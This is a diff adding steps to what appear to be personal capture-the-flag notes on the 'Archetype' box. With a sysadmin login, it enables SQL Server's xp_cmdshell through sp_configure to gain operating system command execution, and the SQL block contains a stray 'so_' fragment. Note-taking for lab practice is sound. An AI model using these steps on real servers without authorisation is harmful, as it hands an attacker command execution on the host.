@@ -61,7 +61,20 @@ Exploration Journey Link:
 First check what role does the user has `SELECT is_srvrolemember('sysadmin');`
 [//]: 1 = True
 
-We can set up command ex
+We can set up command execution because the user has admin privileges.
+
+>  Command Execution
+```sql 
+EXEC sp_configure 'show advanced options', 1; — priv  
+RECONFIGURE; — priv 
+so_
+EXEC sp_configure 'xp_cmdshell', 1; — priv  
+RECONFIGURE; — priv
+```
+[//]: Found in Link 2
+[- priv]: Administrator privileges need it.
+
+
 
 # Archetype
 
